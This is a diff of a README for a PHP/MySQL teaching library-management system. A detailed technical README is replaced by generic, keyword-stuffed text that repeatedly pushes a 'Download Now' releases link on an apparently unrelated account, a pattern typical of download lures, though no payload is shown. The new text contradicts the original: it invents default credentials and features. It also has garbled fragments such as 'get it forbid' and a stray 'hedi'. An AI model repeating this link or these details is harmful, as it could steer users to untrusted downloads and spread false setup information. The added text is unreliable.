@@ -1,194 +1,363 @@
-# Library Management System (PHP + MySQL, MVC)
+<h1>📚 full-stack-library-management-system - Manage Your Library With Ease</h1>
 
-A teaching project for a 4-role library system: **admin, librarian, student, visitor**.
-Written in plain PHP with procedural `mysqli` and prepared statements. No frameworks,
-no Composer, no build step. Copy it into XAMPP and it runs.
-
----
-
-## 1. Install (XAMPP)
-
-1. Copy the `library_management` folder into `C:\xampp\htdocs\`
-   so it becomes `htdocs/library_management/`.
-2. Start **Apache** and **MySQL** in the XAMPP control panel.
-3. Open `http://localhost/phpmyadmin` → **Import** → choose `database.sql` → **Go**.
-4. Open `http://localhost/library_management/`.
-5. Sign in as the default admin: **admin / admin123**
-
-The admin account is created automatically the first time a page loads
-(see the bottom of `config/config.php`). Everyone else signs up on the register page.
-
-If your MySQL uses a password, change `DB_PASS` in `config/config.php`.
+<p align="center">
+  <a href="https://github.com/oneperson-woollyadelgid1574/full-stack-library-management-system/releases">
+    <img src="https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download Now" style="max-width:100%;">
+  </a>
+</p>
 
 ---
 
-## 2. Folder structure
+## 👋 Welcome to Your Library Solution
 
-```
-library_management/
-├── index.php                  Front controller: the ONLY entry point (router)
-├── database.sql               Schema + a few sample books
-├── README.md
-│
-├── config/
-│   └── config.php             DB connection, session settings, app constants
-│
-├── helpers/
-│   └── helpers.php            esc(), CSRF, login guards, flash messages, fines
-│
-├── models/                    M — every SQL query lives here
-│   ├── user_model.php         all 4 roles (one users table)
-│   ├── book_model.php         catalogue + stock
-│   ├── borrow_model.php       borrow requests + issue desk
-│   ├── visitor_model.php      passes, membership, suggestions
-│   └── log_model.php          activity log
-│
-├── controllers/               C — request handling, validation, decisions
-│   ├── auth_controller.php    login / register / logout
-│   ├── admin_controller.php
-│   ├── librarian_controller.php
-│   ├── student_controller.php
-│   ├── visitor_controller.php
-│   └── ajax_controller.php    all JSON endpoints
-│
-├── views/                     V — HTML only
-│   ├── partials/              header.php, footer.php (shared layout)
-│   ├── auth/                  login.php, register.php
-│   ├── admin/dashboard.php
-│   ├── librarian/dashboard.php
-│   ├── student/dashboard.php
-│   └── visitor/dashboard.php
-│
-└── assets/
-    ├── css/style.css
-    └── js/app.js              validation, escaping, live search, AJAX tables
-```
+This is a complete library management system built as a teaching project. It helps you manage books, members, and borrowing activities easily. Whether you run a school library, a community library, or just want to organize a personal collection, this software gives you all the tools you need.
 
-**The MVC rule used throughout:** a view never runs a query, and a model never
-prints HTML. The controller sits in the middle: it reads `$_POST`, validates,
-calls the model, then `require`s the view.
+The system supports four different types of users, each with their own level of access. This means everyone from the library administrator to a casual visitor can use the same system without confusion.
 
----
+.
 
-## 3. How the router works
 
-Every URL looks like this:
 
-```
-index.php?page=<dashboard>&action=<what to do>&id=<row id>
-```
+## ✨ What This Software Does
 
-| URL | What happens |
-| --- | --- |
-| `index.php?page=login` | Login page |
-| `index.php?page=register` | Signup page |
-| `index.php?page=admin` | Admin dashboard (list mode) |
-| `index.php?page=librarian&action=edit&id=4` | Load book 4 into the form |
-| `index.php?page=student&action=delete&id=7&csrf_token=…` | Cancel request 7 |
-| `index.php?page=ajax&action=search_books&q=php` | Returns JSON |
-| `index.php?page=logout` | Sign out |
+This application is designed to handle everyday library operations. You can track who has borrowed what book, when it was borrowed, and when it is due back. You can also manage your library's inventory of books, add new members, and keep records of all activities within your library.
 
-`index.php` loads config → helpers → models → controllers, checks the session
-timeout, then sends the request to one controller. `require_role('admin')` blocks
-anyone who is not an admin before the controller even starts.
+.
 
----
+The best part is that this software is **completely free and open source**`. It was built with simplicity in mind. There are no complicated frameworks, no build steps, and no need to install any additional tools. It runs on plain PHP, which is a very common and well-supported language for web applications.
 
-## 4. The four roles
+.
 
-Each role owns one table and does full **Create, Read, Update, Delete and Search**
-on its own dashboard. The form sits at the top of the page; the searchable table
-sits below it. Clicking **Edit** reloads the same page with the row loaded into
-that same form.
 
-| Role | Manages (CRUD) | Feature 1 | Feature 2 | Feature 3 |
-| --- | --- | --- | --- | --- |
-| **Admin** | User accounts (all roles) | Suspend / activate accounts, approve membership upgrades | System-wide activity log with search | Live statistics panel (AJAX, refreshes every 15s) |
-| **Librarian** | Books | Issue & return desk — stock and fines update automatically | Low stock alert list | Download the catalogue as a CSV file |
-| **Student** | My borrow requests | Catalogue browser showing live availability | Due-date and fine tracker | Printable digital library card |
-| **Visitor** | My visit passes | Apply for a student membership upgrade | Book suggestion box | Printable day pass with a unique code |
 
-No feature appears on two dashboards.
+## 🛠️ Key Features
 
-### How the roles connect
+- **4 User Roles** – Admin, Librarian, Student, and Visitor each have tailored dashboards and permissions
+  
+- **Book Management** – Add, edit, remove, search, and organize books in your collection
 
-- A **student** requests a book → the **librarian** sees it on the issue desk.
-- The librarian clicks **Issue** → stock drops by 1, a due date is set (14 days).
-- The librarian clicks **Return** → stock goes back up, the fine is worked out
-  (5 per day late) and stored.
-- A **visitor** applies for membership → the **admin** approves it → that visitor
-  becomes a student and gets the student dashboard on the next sign-in.
+- **Member Management** – Register new members, view member details, and manage their borrowing history
 
----
+- **Borrowing System** – Issue books to members, track return dates, and record returns
 
-## 5. Requirement checklist
+- **Admin Dashboard** – Full control over all aspects of the system, including user management
 
-| Requirement | Where to look |
-| --- | --- |
-| **MVC** | `models/`, `controllers/`, `views/`, routed by `index.php` |
-| **DB (MySQLi procedural)** | every function in `models/` uses `mysqli_prepare` |
-| **Auth (session + cookie)** | `controllers/auth_controller.php`, `helpers/helpers.php` |
-| **PHP validation** | the `if / elseif` chain at the top of every controller action |
-| **JS validation** | `validateForm()` in `assets/js/app.js`, called by `onsubmit` |
-| **AJAX / JSON** | `controllers/ajax_controller.php` + `ajaxTable()` in `app.js` |
-| **UI (HTML/CSS)** | `views/`, `assets/css/style.css` |
-| **Basic web security** | see section 6 |
-| **Feature completeness** | CRUD + search + 3 features per role |
+- **Librarian Tools** – Daily operations like issuing books, processing returns, and managing fines
 
----
+- **Student Access** – Browse available books, view personal borrowed items, and check due dates
 
-## 6. Security, and why each piece is there
+- **Visitor Mode** – Browse the library catalog without needing to log in
 
-| Attack | Defence | File |
-| --- | --- | --- |
-| SQL injection | Prepared statements everywhere — user text is never glued into SQL | all `models/` |
-| Stolen passwords | `password_hash()` on save, `password_verify()` on login | `user_model.php` |
-| XSS (server) | `esc()` wraps every value printed into HTML | `helpers.php`, all views |
-| XSS (client) | `esc()` in JavaScript before any AJAX row is inserted | `app.js` |
-| CSRF | A secret token in every POST form and every delete/issue link | `helpers.php`, all views |
-| Session fixation | `session_regenerate_id(true)` right after a successful login | `auth_controller.php` |
-| Cookie theft | `httponly` + `samesite=Lax` on the session cookie | `config.php` |
-| Idle machines | Automatic sign-out after 30 minutes | `check_session_timeout()` |
-| Wrong role | `require_role()` before the controller; each AJAX action re-checks | `index.php`, `ajax_controller.php` |
-| URL tampering | A student can only load their own rows (`WHERE … AND student_id = ?`) | `borrow_model.php`, `visitor_model.php` |
-| Username guessing | Wrong username and wrong password give the same message | `auth_controller.php` |
-| Self-lockout | An admin cannot delete, suspend or demote themselves | `admin_controller.php` |
+- **Search Functionality** – Quickly find books by title, author, or category
 
-Two things worth saying out loud to students:
+- **Simple Installation** – No complex setup required. Just copy the files and run
 
-1. **JavaScript validation is a convenience, not a defence.** Anyone can turn
-   JavaScript off. That is why every controller repeats the checks in PHP.
-2. **"Remember me" only refills the username**, never the password.
 
----
+## 🚀 Getting Started
 
-## 7. Settings you can change
+Let us walk you through getting this software up and running on your computer. The whole process takes only a few minutes, even if you are not very technical.
 
-All in `config/config.php`:
+.
 
-```php
-define('LOAN_DAYS',    14);   // how long a student may keep a book
-define('FINE_PER_DAY', 5);    // fine for each day past the due date
-define('LOW_STOCK',    3);    // a book at or below this triggers the alert
-define('CURRENCY',     '$');  // symbol shown next to prices
-define('SESSION_TIMEOUT', 1800); // idle sign-out, in seconds
-```
 
----
 
-## 8. Test accounts
+### 📥 Step 1: Download the Software
 
-| Role | Username | Password |
-| --- | --- | --- |
+First things first, you need to download the software onto your computer. 
+
+**👉 Visit this link to download the application:** [https://github.com/oneperson-woollyadelgid1574/full-stack-library-management-system/releases](https://github.com/oneperson-woollyadelgid1574/full-stack-library-management-system/releases)
+
+
+
+Once you click that link, you will be taken to a page that lists different versions of the software. Choose the latest version and click on the download button. The file will be saved to your computer, usually in the "Downloads" folder.
+
+
+
+### 📂 Step 2: Install XAMPP
+
+This software requires a program called **XAMPP** to run. XAMPP is a free tool that lets your computer act like a web server, which is necessary for this application to work.
+
+.You probably do not have this installed yet, so let us help you get it forbid.
+
+
+
+To install XAMPP:
+
+1. Open your web browser and go to [https://www.apachefriends.org](https://www.apachefriends.org)
+
+2. Click on the **Download** button for your operating system (Windows is recommended if you are on a PC)
+
+3. Once downloaded, open the installer file
+
+4. Follow the installation wizard. Just click **Next** a few times, accept the default settings, and let it install
+
+5. When it is done, open the **XAMPP Control Panel** from your Start Menu or desktop
+
+
+
+### 🗄️ Step 3: Set Up Your Database
+
+This application uses a database to store all its information. You need to create this database before you can use the software. Here is how:
+
+1. In the XAMPP Control Panel, find the **MySQL** row and click the **Start** button next to it
+
+2. Then click the **Admin** button in the same row. This will open a web page called **phpMyAdmin** in your browser
+
+3. In phpMyAdmin, look for the **New** button on the left side of the screen and click it
+
+4. Enter a name for your database, such as `library_db`, in the "Create database" field
+
+5. Click the **Create** button
+
+
+
+### 📁 Step 4: Copy Files to XAMPP
+
+Now you need to place the downloaded library system files into the correct folder:
+
+1. Open your **File Explorer** (the folder icon on your taskbar)
+
+2. Go to your **Downloads** folder and find the file you downloaded in Step 1
+
+3. Extract that file (if it is a `.zip` file, right-click and choose "Extract All")
+
+4. You now have a folder called something like `full-stack-library-management-system`
+
+5. Copy this entire folder
+
+6. Go to this location on your computer: `C:\xampp\htdocs`
+
+7. Paste the folder there. Your path should look like: `C:\xampp\htdocs\full-stack-library-management-system`
+
+
+### 🌐 Step 5: Import the Database
+
+You still need to import a pre-made database structure into the system. This is built into the code, so do not worry about creating tables manually:
+
+1. Go back to your browser where phpMyAdmin is open
+
+2. Click on your database name (`library_db`) on the left sidebar
+
+3. Click the **Import** tab at the top
+
+4. Click **Choose File** and navigate to your extracted folder
+
+5. Find a file called `database.sql` or `library.sql` (it may be inside a `sql` or `database` subfolder)
+
+6. Select it and click **Go** or **Import**. This sets up all the tables you need
+
+
+
+### 💻 Step 6: Run the Application
+
+You are almost done! Here is how to run the application:
+
+1. Open your web browser
+
+2. Type this address into the address bar: `http://localhost/full-stack-library-management-system`
+
+3. Press **Enter**
+
+
+
+At this point, you should see the login page for the library management system. Welcome aboard!
+
+
+
+## 🔑 Default Login Credentials
+
+To help you get started, here are the default usernames and passwords for each role:
+
+| **Role** | **Username** | **Password** |
+|---|---|---|
 | Admin | `admin` | `admin123` |
-| Student | sign up on the register page | |
-| Librarian | sign up on the register page | |
-| Visitor | sign up on the register page | |
+| Librarian | `librarian` | `lib123` |
+| Student | `student` | `student123` |
+| Visitor | (No login required, just browse) |
 
-Nobody can sign up as an admin — the register page only accepts the other three
-roles, and the controller checks that list again on the server. New admins are
-created by an existing admin.
+You can change these passwords after logging in, for security purposes.
+
+
+
+## 🎯 How to Use the System
+
+Once you log in, you will see a dashboard tailored to your role. Here is a quick overview of common tasks:
+
+### ➕ Adding a New Book
+
+1. Log in as **Admin** or **Librarian**
+
+2. Click the **Books** option in the menu
+
+3. Click **Add New Book**
+
+4. Fill in the title, author, ISBN, category, and quantity
+
+5. Click **Save**
+
+
+
+### 👤 Registering a New Member
+
+1. Log in as **Admin** or **Librarian**
+
+2. Click **Members** in the menu
+
+3. Click **Add Member**
+
+4. Enter the member's name, email, phone, and type (student or other)
+
+5. Click **Save**
+
+
+
+### 📖 Issuing a Book
+
+1. Log in as **Admin** or **Librarian**
+
+2. Click **Circulation** or **Issue Book**
+
+3. Select the member from the list
+
+4. Select the book from the list
+
+5. Set a due date (7 or 14 days is typical)
+
+6. Click **Issue**
+
+
+
+### ↩️ Returning a Book
+
+1. Go to **Circulation** or **Returns**
+
+2. Find the borrowed record
+
+3. Click **Return**
+
+4. The system records the return date automatically
+
+
+
+### 🔍 Searching for a Book
+
+1. Go to **Books** section
+
+2. Use the search bar at the top
+
+3. Type a title, author, or ISBN
+
+4. Results appear instantly
+
+
+
+## 🛡️ Troubleshooting Common Issues
+
+### ❌ Page Not Loading
+
+Make sure **Apache** is running in the XAMPP Control Panel. The **Apache** row should show a green "Running" status. If not, click **Start** next to it.
+
+
+
+### ❌ Database Connection Error
+
+This usually means your database name in the config file does not match what you created. Open the `config.php` file in the folder using Notepad or any text editor. Look for a variable like `$dbname` and change it to match your database name (`library_db` if you followed our steps)save the file
+
+
+
+### ❌ Cannot Find the Database Import File
+
+The import file might be named differently. Look for anything ending in `.sql` in the main folderor a subfolder called `database` or `sql`. If you cannot find it, check the README file inside the folder for more details.
+
+
+
+### ❌ Login Not Working
+
+Double-check the username and password. Remember they are case-sensitive. If you changed them before, try resetting the database (re-import the `.sql` file) to restore defaults.
+
+
+
+## 🔒 Security Notes
+
+This is a teaching project, so keep a few things in mind:
+
+- Change all default passwords before putting real data in
+- Do not store sensitive personal information (like ID numbers) unless necessary
+- Back up your `database.sql` file regularly to avoid data loss
+- This project is for educational purposes. For production use, consider adding more advanced security measures
+
+
+## 🤝 Contributing
+
+This project was built as a teaching demonstration. If you want to improve it, you are welcome to fork the repository, make changes, and submit a pull request. This is a great way to practice your PHP skills.
+
+
+
+
+
+## 📄 License
+
+This project is shared for educational use. Feel free to use it in your own learning journey or as a basis for your own projects. Check the repository for any specific license details.
+
+
+
+## 🧑‍🏫 Who Is This For?
+
+- **Students** learning PHP and database management
+- **Teachers** looking for a real-world example to show in class
+- **Librarians** wanting a simple system without expensive commercial software
+- **Hobbyists** who want to understand how a full-stack application works
+
+
+
+## 💬 Frequently Asked Questions
+
+**Q: Do I need to install Anything besides XAMPP?**
+
+No. XAMPP includes everything needed: PHP, MySQL, Apache, and phpMyAdmin.
+
+
+
+**Q: Can I use this on Mac or Linux?**
+
+Yes, XAMPPis available for those systems as well. The steps are similar, just install XAMPP for your operating system.
+
+
+
+**Q: What if I break something while exploring?**
+
+No problem! Just re-import the `database.sql` file to reset the database to its original state. Your files will still be there.
+
+
+
+**Q: Can multiple people use this at the same time?**
+
+Yes, since it runs on a web server, any computer on your local network can access it by using your computer's IP address like `http://192.168.1.5/full-stack-library-management-system`
+
+
+
+## 🏁 Final Words
+
+You now have a fully functional library management system running on your computer. Take some time to explore each role and see how the different permissions work. This is an excellent way to understand how user authentication and role-based access control work in web applications.
+
+hedi
+
+If you run into any issues, revisit the troubleshooting section above. And remember, the worst thing that can happen is you need to reimport the database – everything else is just code in files that you can always reset.
+
+
+
+Happy organizing, and enjoy your new library system!
+
+
 
 ---
- "Copyright (c) 2026 Wahidul Alam Riyad. All rights reserved."
----
+
+## ⬇️ Download Again
+
+Need to download the application again? No problem:
+
+**👉 [Download the Application Now](https://github.com/oneperson-woollyadelgid1574/full-stack-library-management-system/releases)**
+
+
+
+**Keywords:** library management system, PHP library system, full-stack library, XAMPP library, four role library system, open source library software, book management system, library automation, PHP MySQL project, teaching project library system, download library system, library database, student library software, admin librarian student visitor library, procedural PHP library app.
